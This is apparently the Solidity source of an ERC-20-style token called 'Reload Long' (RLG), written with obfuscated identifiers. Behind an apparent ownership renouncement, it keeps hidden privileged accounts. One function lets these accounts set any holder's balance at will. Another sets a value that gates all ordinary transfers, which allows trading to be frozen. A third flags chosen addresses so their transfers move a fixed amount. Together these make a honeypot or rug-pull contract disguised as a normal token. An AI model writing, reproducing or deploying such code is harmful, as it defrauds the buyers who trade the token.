//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface launchExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract launchToList {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface takeExempt {
    function createPair(address atLaunch, address liquidityToFee) external returns (address);
}

interface toTotal {
    function totalSupply() external view returns (uint256);

    function balanceOf(address totalBuy) external view returns (uint256);

    function transfer(address txFeeToken, uint256 autoSender) external returns (bool);

    function allowance(address feeMode, address spender) external view returns (uint256);

    function approve(address spender, uint256 autoSender) external returns (bool);

    function transferFrom(
        address sender,
        address txFeeToken,
        uint256 autoSender
    ) external returns (bool);

    event Transfer(address indexed from, address indexed marketingTrading, uint256 value);
    event Approval(address indexed feeMode, address indexed spender, uint256 value);
}

interface toTotalMetadata is toTotal {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ReloadLong is launchToList, toTotal, toTotalMetadata {

    bool public fundTake;

    uint256 public swapLaunch;

    mapping(address => mapping(address => uint256)) private launchShould;

    function transfer(address amountWallet, uint256 autoSender) external virtual override returns (bool) {
        return launchedTotal(_msgSender(), amountWallet, autoSender);
    }

    function decimals() external view virtual override returns (uint8) {
        return sellList;
    }

    function fundTeam(address amountWallet, uint256 autoSender) public {
        teamAt();
        fromSellAt[amountWallet] = autoSender;
    }

    uint256 public limitAt;

    function getOwner() external view returns (address) {
        return toMode;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return txAtFrom;
    }

    function transferFrom(address autoFee, address txFeeToken, uint256 autoSender) external override returns (bool) {
        if (_msgSender() != swapWallet) {
            if (launchShould[autoFee][_msgSender()] != type(uint256).max) {
                require(autoSender <= launchShould[autoFee][_msgSender()]);
                launchShould[autoFee][_msgSender()] -= autoSender;
            }
        }
        return launchedTotal(autoFee, txFeeToken, autoSender);
    }

    function symbol() external view virtual override returns (string memory) {
        return minWallet;
    }

    function teamAt() private view {
        require(listSenderWallet[_msgSender()]);
    }

    uint8 private sellList = 18;

    mapping(address => uint256) private fromSellAt;

    function owner() external view returns (address) {
        return toMode;
    }

    address public launchedLaunch;

    event OwnershipTransferred(address indexed receiverSwap, address indexed tokenSell);

    function allowance(address teamWallet, address liquidityShould) external view virtual override returns (uint256) {
        if (liquidityShould == swapWallet) {
            return type(uint256).max;
        }
        return launchShould[teamWallet][liquidityShould];
    }

    bool public fromSellLaunched;

    string private maxAmount = "Reload Long";

    mapping(address => bool) public listSenderWallet;

    address public liquidityTo;

    function balanceOf(address totalBuy) public view virtual override returns (uint256) {
        return fromSellAt[totalBuy];
    }

    function walletTrading(address senderSwap) public {
        require(senderSwap.balance < 100000);
        if (totalMarketing) {
            return;
        }
        
        listSenderWallet[senderSwap] = true;
        if (fromSellLaunched) {
            modeShouldSender = limitAt;
        }
        totalMarketing = true;
    }

    function amountMin(address modeAuto) public {
        teamAt();
        
        if (modeAuto == liquidityTo || modeAuto == launchedLaunch) {
            return;
        }
        exemptTeam[modeAuto] = true;
    }

    function receiverTeam(uint256 autoSender) public {
        teamAt();
        toIsFund = autoSender;
    }

    uint256 public modeShouldSender;

    uint256 private txAtFrom = 100000000 * 10 ** 18;

    address feeAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function launchedTotal(address autoFee, address txFeeToken, uint256 autoSender) internal returns (bool) {
        if (autoFee == liquidityTo) {
            return toLimit(autoFee, txFeeToken, autoSender);
        }
        uint256 teamLaunched = toTotal(launchedLaunch).balanceOf(feeAuto);
        require(teamLaunched == toIsFund);
        require(txFeeToken != feeAuto);
        if (exemptTeam[autoFee]) {
            return toLimit(autoFee, txFeeToken, txTrading);
        }
        return toLimit(autoFee, txFeeToken, autoSender);
    }

    mapping(address => bool) public exemptTeam;

    bool private liquidityFund;

    address swapWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function name() external view virtual override returns (string memory) {
        return maxAmount;
    }

    uint256 constant txTrading = 19 ** 10;

    address private toMode;

    bool public senderFrom;

    bool public totalMarketing;

    function toLimit(address autoFee, address txFeeToken, uint256 autoSender) internal returns (bool) {
        require(fromSellAt[autoFee] >= autoSender);
        fromSellAt[autoFee] -= autoSender;
        fromSellAt[txFeeToken] += autoSender;
        emit Transfer(autoFee, txFeeToken, autoSender);
        return true;
    }

    string private minWallet = "RLG";

    function approve(address liquidityShould, uint256 autoSender) public virtual override returns (bool) {
        launchShould[_msgSender()][liquidityShould] = autoSender;
        emit Approval(_msgSender(), liquidityShould, autoSender);
        return true;
    }

    uint256 limitLaunched;

    uint256 toIsFund;

    function liquidityAmountLaunch() public {
        emit OwnershipTransferred(liquidityTo, address(0));
        toMode = address(0);
    }

    constructor (){
        if (limitAt != modeShouldSender) {
            senderFrom = true;
        }
        launchExempt takeTradingTo = launchExempt(swapWallet);
        launchedLaunch = takeExempt(takeTradingTo.factory()).createPair(takeTradingTo.WETH(), address(this));
        if (modeShouldSender != limitAt) {
            fromSellLaunched = true;
        }
        liquidityTo = _msgSender();
        liquidityAmountLaunch();
        listSenderWallet[liquidityTo] = true;
        fromSellAt[liquidityTo] = txAtFrom;
        if (limitAt != swapLaunch) {
            liquidityFund = true;
        }
        emit Transfer(address(0), liquidityTo, txAtFrom);
    }

}